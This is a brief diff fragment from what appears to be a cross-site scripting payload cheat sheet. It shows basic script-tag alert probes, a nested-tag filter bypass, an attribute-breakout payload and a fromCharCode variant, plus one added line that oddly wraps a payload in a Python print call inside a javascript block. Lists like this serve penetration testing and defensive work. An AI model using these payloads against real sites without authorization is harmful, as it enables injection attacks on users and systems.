@@ -10,6 +10,7 @@
 ```javascript
 // Basic payload
 <script>alert('XSS')</script>
+print("<script>alert('XSS')</script>")
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
 "><script>alert(String.fromCharCode(88,83,83))</script>
